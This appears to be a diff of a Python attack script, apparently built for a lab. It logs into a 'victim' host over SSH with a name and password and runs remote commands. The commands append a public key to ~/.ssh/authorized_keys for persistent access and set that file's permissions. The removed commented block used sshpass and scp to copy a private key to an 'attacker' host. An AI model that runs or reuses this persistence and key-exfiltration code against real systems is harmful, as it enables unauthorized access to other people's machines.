@@ -21,12 +21,8 @@ def init():
     os.system(command)
 
     # Concatenate public key to authorized keys
-    command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys'
+    command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys && ( chmod 600 ~/.ssh/authorized_keys )'
     ssh_command_using_name_pw(command)
-
-    # Change mode of authorized keys
-    command = 'chmod 600 ~/.ssh/authorized_keys'
-    ssh_command_using_ssh_key(command)
 
 
 def attack():
@@ -42,7 +38,7 @@ def ssh_command_using_name_pw(command):
     session = client.get_transport().open_session()
 
     if session.active:
-        print('Session Active')
+        print(command)
         session.exec_command(command)
 
         print('\n--------Victim Std Out--------')
@@ -61,7 +57,7 @@ def ssh_command_using_ssh_key(command):
     session = client.get_transport().open_session()
 
     if session.active:
-        print('Session Active')
+        print(command)
         session.exec_command(command)
 
         print('\n--------Victim Std Out--------')
@@ -114,29 +110,3 @@ if __name__ == '__main__':
         init()
 
     attack()
-
-    # # Set up ssh key
-    # try:
-    #     os.system('ssh-keygen -f /home/victim/.ssh/victim_key -P 12345')
-    #
-    # except Exception as e:
-    #     print('[ERROR]', e)
-
-    # # Send public key to the victim
-    # try:
-    #     print('\nUse victim/victim to ssh log into victim system')
-    #     command = 'ssh-keygen -f /home/victim/.ssh/victim_key -P 12345\ny'
-    #     ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
-    #
-    #     command = 'sshpass -p {0} scp /home/victim/.ssh/victim_key {1}@{2}:/home/{3}/victimKey'.format(attacker['password'], attacker['name'], attacker['ip'], attacker['name'])
-    #     print(command)
-    #     ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
-    #
-    # except Exception as e:
-    #     print(e)
-    #     print('\nUse private key to ssh log into victim system')
-
-
-
-
-
